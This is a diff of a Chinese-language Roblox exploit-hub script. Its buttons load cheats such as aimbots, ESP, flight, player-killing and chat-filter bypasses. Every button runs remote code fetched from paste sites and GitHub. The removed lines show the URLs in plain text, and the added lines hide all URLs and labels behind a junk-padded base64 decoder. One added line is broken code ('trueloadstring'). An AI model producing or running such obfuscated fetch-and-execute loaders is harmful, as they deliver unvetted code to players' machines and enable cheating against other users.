-    credits:Button("黑洞脚本",function()
-    loadstring(game:HttpGet("https://shz.al/~KAKAKKKKSS"))()
-end)
-    credits:Button("死亡笔记",function()
-    loadstring(game:HttpGet("https://shz.al/~KKKSS"))()
-end)
-    credits:Button("想杀谁就杀谁",function()
-    loadstring(game:HttpGet("https://shz.al/~HHHS"))()
-end)
-    credits:Button("变玩家",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/XR4sGcgJ"))()
-end)
-    credits:Button("C00lgui",function()
-    loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
-end)
-    credits:Button("声音播放器",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/GEianeKX"))()
-end)
-    credits:Button("物理枪",function()
-    loadstring(game:HttpGet("https://shz.al/~KJANNKSKKS"))()
-end)
-    credits:Button("1x1x1x1",function()
-    loadstring(game:HttpGet(('https://pastebin.com/raw/JipYNCht'),true))()
-end)
-local credits = creds:section("『LINNI』跟踪脚本系列",true)
-    credits:Button("老外跟踪1『不用自己打字搜索旁边有可以选择玩家』",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Teleport%20Gui.lua'))()
-end)
-    credits:Button("霖溺的跟踪玩家『需要自己搜索，每次跟踪都要点击』",function()
-    loadstring(game:HttpGet("https://shz.al/xtQP"))()
-end)
-    credits:Button("老外跟踪脚本2『需要自己搜索，但是点击后就不用点击了，只不过不能移动，需要变小建议找霖溺』",function()
-    loadstring(game:HttpGet("https://shz.al/~LDSLS66"))()
-end)
-local credits = creds:section("通用脚本",true)
-    credits:Button("工具包",function()
-    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
-end)
-    credits:Button("骂人无违规",function()
-    loadstring(game:GetObjects("rbxassetid://1262435912")[1].Source)()
-end)
-    credits:Button("超高画质",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/jHBfJYmS"))()
-end)
-    credits:Button("工具挂",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/StandAwekening.lua"))()
-end)
-    credits:Button("电脑键盘",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
-end)
-    credits:Button("宙斯飞行V3『未汉化』",function()
-    loadstring(game:HttpGet("https://shz.al/~ArceusXFlyV3"))()
-end)
-    credits:Button("KRNL",function()
-    loadstring(game:HttpGet("https://shz.al/~KRNLRobloxScirpt"))()
-end)
-    credits:Button("宙斯自瞄『未汉化』",function()
-    loadstring(game:HttpGet("https://shz.al/~ArceusXAimbot"))()
-end)
-    credits:Button("Sonic",function()
-    loadstring(game:HttpGet("https://shz.al/~SonicRobloxScirpt"))()
-end)
-    credits:Button("Tiger",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/balintTheDevX/TigerX-V2/main/Back"))()
-end)
-    credits:Button("Alysse",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/AlysseAndroid/main/loader.lua"))()
-end)
-    credits:Button("宙斯V3",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
-end)
-    credits:Button("acrylix",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/3dsonsuce/acrylix/main/Acrylix'))()
-end)
-    credits:Button("透视",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
-end)
-    credits:Button("Synapse",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/tWGxhNq0"))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YNvOjugSOTsTMSQHucrJdTQrBfZWoMYAPtZTSpYKGclzOjzaQCxggpbpoVFQealvbcfwvW44COTElOTkkgU2NyaXB044CP'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xCduYxFYerwGLYCbSQADhVdmmHJQstPltJzcPiYMgJaNRcgWaPUGXjpyTLEUCAIwcUUbFn6Z2e5bi45aix5LmQ'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sdAikaaqWiNCuWdOrWKgWOEwmzqElMWzFIQAqucIlMYIwsZTmxsPVaGKQhmRuyQRhtQpWyaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tpbmdIYXh4b3IvS2luZy1IYXgtR3VpL21haW4vQXJhYi1HdWklRTIlOTglODU=')))();
 end)
 
-local creds = window:Tab("霖溺汉化阿尔宙斯脚本",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('srCkmaAvwjRTILwOXCFAdWNwCUfSnXJEzOhODUcbHxyXUtdBnrWAWdFucsKifsKZSWDUim6YCa55So'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BYoWLswAVsjfrZQKpNalByNtMWfhCqctdCjNJCVCvYUdAdrsQAvOUAEQqemhhMaaQYfNpnMTYwNjAzMzM0NDg='))
 
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("霖溺汉化阿尔宙斯瞄准",function()
-    loadstring(game:HttpGet("https://shz.al/~KKA"))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gFltVDqCVUiAoQgfKoJDhEZjqZtcclbzsUkFkmrAppbMMsZcVwahxIUTBIHZzjNPoAXWsA6YCa55So6ISa5pys'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SgCMuMoeLQhIHlkGRCeULxSGQkdkeylcWfGjWKWWNecaqehfXgfMcnkIbDynVMqWYZYAnk6IGK5aSp5rCU5rOh576O5YyW6L+Z5Liq6Ieq5Yi2'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RosIuRowRXmiuCqcvnXvTOjFEpJBAeHwUXVAWkCEblyLvMszKqhksyGKfJfNBnbePgxSMmaHR0cHM6Ly9zaHouYWwvfmxuaU5pbWVpaHVh')))()
 end)
-    credits:Button("霖溺汉化阿尔宙斯飞行『推荐用这个飞行』",function()
-    loadstring(game:HttpGet("https://shz.al/~KKDKS"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CcQjudntIqMkHmSVqkZXnQrTNGbGJDcMsQtSusZfTibueSMfQrARYwzQDOStPprutKCqsY6ZyW5rq6RlBT'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lfKQinmSJSNpGzGLMWnsmnYXpXMGHVTkfqxyGHFUpFSYMVUWWqDYKeUjahSRsSIyiOwpLZaHR0cHM6Ly9zaHouYWwvfkZISEY=')))()
 end)
-    credits:Button("霖溺电脑端ESP『找不到阿尔宙斯ESP所以用这个绘制替代』",function()
-    loadstring(game:HttpGet("https://shz.al/~MMSJS"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PNqakeyjJwTGsirtKwRpanvxqDUxcltdMDsXVwMoneheSCgkqOKAfDwZHmJESQGrPZxDSu546p5a625Yqg5YWl5ri45oiP5o+Q56S6'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vXstKGBoQbWKSbxPEVwOMQSJToOKlxazepkLbOXwrXlFjpLUNLdTXWeSSAgBfLWVdXZTKraHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JveXNjcC9zY3Jpc2NyaXB0c2MvbWFpbi9iYm4ubHVh')))()
 end)
-    credits:Button("这个源太长了霖溺无能为力『DEX-Explorer』",function()
-    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bHfmVEtdTrzluSkBfAXgbWikCkeuovUTReXUHfkzvjWzECTQMHhgyflxhUGIJoBZBXVGTs57uY5Yi244CO5bCP5aSp44CP'),function()
+    loadstring(game:HttpGet((tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zeYZMmqriQqRtiuMyOCYaawpvnwyuIRtBJCMLttSjalCurGJfBeLycspHpxteBCFXhhmVraHR0cHM6Ly9zaHouYWwvflhpYW90aWFuL0VTUFNjcmlwdA=='))))()
 end)
-    credits:Button("另一种esp『霖溺找的』",function()
-    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD%20ESP.txt"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NSUkWeTWzHeeCWaXoNPFhpHKICZWTYBPNqlouYrBuAKNqggAjmuHEnedhmTAhbXfPLEmYl56m/5aKZ'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oQTFunYIncdZkzwZDmjMvclxeumHWqkoZnESKwRozdaYNJXsMfmXBGuXAFAXFDdaARjyemaHR0cHM6Ly9naXRodWIuY29tL0RYdXd1L09LL3Jhdy9tYWluL2NsaXA=')))()
 end)
-    credits:Button("infinite-Yield『懒得汉化了』",function()
-    loadstring(game:HttpGet("https://shz.al/~DCFF"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cmJSaFyaHCZlyMLTqFhBCaAzLCwEstjpGcoHulLLQRgzatzRrGbHjUHihNcejzpIMZWSPW5Lq654mp5L2T56ev4oCm4oCm5rGJ5YyW'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MltfQcSzYacZsajdUiGUjHRfGAnhRUkjnIoPhtxfmvBnRAbjCmZhUaqZIxRQfXssgYanSbaHR0cHM6Ly9zaHouYWwvfktTSlhCQzYy')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PHDcDXfzATcbVtULstwpogYmTpPSyNmqfWgsKUBJlbUCowTMTpahAXUGBaQuxoIvxAvdEX6aOe6L2m44CO6ZyW5rq644CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XarPzmSiiiLrmBmyImicRKcJCUqsgaTWcObbsvqZKtkJLWRIpzLUxsgwvDvURFnWfuRbkmaHR0cHM6Ly9zaHouYWwvfktJU0pT')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DlVwwcpTazfDSfMjepdTstkIEauDRICzqHEHAhRhLOjmtEknTdItQqCnhqBkwrVhZySLAO6ZyW5rq655Sp6aOe'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xrdxDfOxADqDHmoqKFWCXiCoSPRnXqjoILWMrDRpAMTZTYiOWIuZXWRQKxBGrXpRuzdSRqaHR0cHM6Ly9zaHouYWwvfmxpbk5J')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fBKxqsesIEFFeGjjEJVJLMLdvoRFuaDmOTIlzxiNHrzNsKVhFhOuAgWKSdteuRiflvHcqu6aOe6KGM'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AFTiqrCRhBEsEMySKHdiQlvycRdGbbyWvVjmkPLXTZztKrqDOiNJxUVfpMFEsCNZhmBQVfaHR0cHM6Ly9zaHouYWwvfmhoaGg=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cwUtoUzzkqzOHAPxrjUpJoBdvNeVPxeTFryorUPDiMRLabBZkCqNLiMuxxXdfzePWsXATx5aSc6KeG5Luq'),function()
+    _G.OnShop = trueloadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CqJOCMWEnGDiILGrTZLsyRUQbvMRvwTlzZIeaupYCLgdEpbNDdOzfklovRSMNtfmUvGkgRaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlaXZpZENvbVNvbm8vU2NyaXB0cy9tYWluL1NjYW5uZXIubHVh')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FwjXZgdIPTPMbeTdSObNKgOFHjtlHzeTKrUEHWpAogDrNJcEoVTvWjWixRxYXCdJGZKSCY5q2j5bi46IyD5Zu0'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AZzQlknFLRBOTPwLTXRyYkxCPjKFklokttVOXYGEhtnfdhjIGolIIyQkUQxynzIfUnXzooaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2ppTndEYkNO')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wZRUrdtLplREQuUQPqNzETKnhelGKncpbcnQQeLiaMxZYypnjpEFaSiYhuCjQXxSXCVAWc5Lit562J6IyD5Zu0'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HnzFXcfYTlrLgesMMgfMRAgeeAYRzndpLRwHGwSJBmTJDGpVtDcxprDFHIFbaUqVBJPgmKaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3gxM2J3ckZi')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yLxWWUmOrxuhmkcjgMGmvvfNmXbrzKLIKwSFdFEnhUKVbCJvFEUTGVjWSWpwAtJPRhrosQ6auY57qn6IyD5Zu0'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tcGvFGCbVJJMHppyIgFTuMSbNprwSmApNaQfFNfTphvUvLOAxDSVNxsadunxWhVeNGkLWzaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0tLWTlFcFpV')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dDJHnDzkjpOldFinrWPwvYyHrttAOXwVYreUVIGLJGWPxhXwXMtxnqsELTegXRzGoVYeSP5Y+N5oyC5py6'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rCVZnGeqdEIiINkPzpwbfLrFRhrVTxIQoMXLHAOYcgdFJlzeVPKUfomzCsnPvXeuMGQRseaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzlmRnU0M0ZG')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qyaLUyEztlKICeuAifRqHZENkSHcuvfQvZSJEYuhVDKAdAUhEzNgWqljOEFjWCBsdRJvMT5peg6ZmQ6Lez'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vsGbpVSFIoRtBGZUWndcllBsgapKWPqRSsTRXDrclShyJvRwiDPEtpBKvbZgfAItvvjCiTaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1Y1UFF5M3kw'), true))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PZrFXQPWZrxuWbzFuKKoObQONgPIwJGYSXCycvDweRuvvTkgMMFbZbuqsksikStiAnTwLs5ZC45Lq66ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('joRerKHZLKMdjzEZFoVDRbbTtMoARFPomZOnrnpvJeUgAlpcqKFfVnmqNUnfcczVXSjpyXaHR0cHM6Ly9zaHouYWwvfkhIQUtT')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('etbERqLBEpIjRzIMWfElndmccytvTtMMJqunkcfOBnspnMxhsQOpyebJCVNMzeAwLQdxjD5Lq654mp5peg5pWM'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PcPLhhZPdKYJkpGGBVbRkfonaMxEAIkGhKZWUmMdaMnmpFSKoutkWUXKjsZTMfryLCtnWnaHR0cHM6Ly9zaHouYWwvfkhISFNOTk5LSUE=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XfJqRaAWJGVDSLKCCKfSOBwxASXTctzhvXalSyLPqaaBzHGffEJCvWSdcVrNKXWwEcnwfW6aOe5qqQ6LWw5aOB'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eFsuvqDNLusWTlxffFUiLNbbyHSwdFgLyNvQhxafzkfYCEBWcxvahOqvCxNbskHxpigbZDaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3pYazRScTJy')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UdgQtQDztdiAWXRqfnUcqImisdDlMYVgKWRbhknrMaqaVyBPaWsnECHfTcoELmQBsGBPmH6LiP56m66KGM6LWw'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AOVahbshxPAvCXMKFUVlDlHgJBjuLSMIYcQBCzfwDJVLCzBDVVXdXTpFMjdKymJqOKzfmkaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dob3N0UGxheWVyMzUyL1Rlc3Q0L21haW4vRmxvYXQ=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bvDPleEaFYETzblqhHjgbVQgEUfwlbwaJcapXaiCmApurxGYriUxgGlOmbdTqZnaCjRFSp6buR5rSe6ISa5pys'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oDOJnQbDoFVNxjFKewfMJnHbniExrnjpSiLdKCrSdQxkrmneWINdKuRsuOMxAmmvvJQnQNaHR0cHM6Ly9zaHouYWwvfktBS0FLS0tLU1M=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aqBdjFvqzAVmUDkchPhtdenxbNnvfguRAoZHvPGJEKUugeoGjlaMnDovSJqNSiaJYdONnT5q275Lqh56yU6K6w'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PZgQKrAMrMdzLfPOkDzYRANIgaAoNcNbciQBnetsCwZdRfMDWWgzHgkAraijUZXYoziWXXaHR0cHM6Ly9zaHouYWwvfktLS1NT')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('stXBZGICNYoKwhpZQZQREpKWhyTILFuzMboxGVoNUuRMnmjfIezcGKHNBLqGEkvaBRoBZx5oOz5p2A6LCB5bCx5p2A6LCB'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uBTCoaHgZLWIefCqeBhhMnykFonlNqGGOAasXeSBRGXEdIkzUuZZxPcPgwbiaqBDycFKdYaHR0cHM6Ly9zaHouYWwvfkhISFM=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VswLVpHHOTjAxVBlgHKrJJEVbjjILtxQqlqnuozwyWobBmYNFuBFormYQXSYCRHkxXymeV5Y+Y546p5a62'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mGYglQptRtvtXTeFhmwIFEHEovCtvcQILSrMuhiDwsymlCDnYQkvARigDkMFibsqvjOxnoaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1hSNHNHY2dK')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KceNhSIWSiJjtVFnANSxBZVWymrIRfjzuXPzfPRRHkMVnUYONSmzQKwaYHdYcahZctrxiDQzAwbGd1aQ=='),function()
+    loadstring(game:GetObjects(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dBUCSNrAYAeuaziSpLWxRDAJxOyJiRHyibZQTPCGDxkVslrFYcKAcHBBUDQaVpPuwDZOdacmJ4YXNzZXRpZDovLzgxMjcyOTc4NTI='))[1].Source)()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rmBvfXILBBbwkyBMtdpKcfDqYTDgdKBsOiTDpEUQAgKELtYcvAchhtAiILgNPAohBDLMrB5aOw6Z+z5pKt5pS+5Zmo'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BOMCkAYxDCXWkqfNkkWlPhUCvqcyEnNFoSLucnnhtDeQfOidURUbsEpUoWwLXWIfzJhMgkaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0dFaWFuZUtY')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hYFsfeuuJUhpmvEZIkbzpPVdUPEsbBDFIGVADgdOlNEPKzDoIAsEjJaxDySzSdBTBzGnGL54mp55CG5p6q'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YiRbKpZvPWqERQeHWVhQhQJWqcvysEYkdAcvLeMGVBDoiMBsBgNDIiSalvCqQxRxbPvEKnaHR0cHM6Ly9zaHouYWwvfktKQU5OS1NLS1M=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('haPEVUNsyGqDlPDPiRKZpDmKCLNxszbhKirtePmtANsyDowlefFJjUCELjUqFVsSRRHoZIMXgxeDF4MQ=='),function()
+    loadstring(game:HttpGet((tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UwxPEeJOOkZIPfQDdmakDHMbiRkUlqUWimabdxeQwrsyBpYLeoHicSCsSdYVTeietXvYbqaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0ppcFlOQ2h0')),true))()
+end)
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RXJuhkachwhqnANzheNsOuHGPwtQuyVwFiyCwHfKLSqdjasxUSDBDAXMFMTFeRqjWaUONq44COTElOTknjgI/ot5/ouKrohJrmnKzns7vliJc='),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qEeFfnPagfArzHBTgcMoZSsFOtdiRmCqaxWPOMYbJIAzxDsbVHSvIHjeQTkSvHuoQOXNpK6ICB5aSW6Lef6LiqMeOAjuS4jeeUqOiHquW3seaJk+Wtl+aQnOe0ouaXgei+ueacieWPr+S7pemAieaLqeeOqeWutuOAjw=='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ukODGuoiJnNGNSZgvGiduOGkACMTdtOlzPyyMtmREsADBGnFBaYNzlNlIkpdoEPdHQTnVaaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0luZmluaXR5MjM0Ni9UZWN0LU1lbnUvbWFpbi9UZWxlcG9ydCUyMEd1aS5sdWE=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NhVdubEXEiOFUhvRPsUwRtQGtFRoUxIaVbpNRApCTcEVvzeLKbPPYKnThiOVcvKQLcqPGh6ZyW5rq655qE6Lef6Liq546p5a6244CO6ZyA6KaB6Ieq5bex5pCc57Si77yM5q+P5qyh6Lef6Liq6YO96KaB54K55Ye744CP'),function()
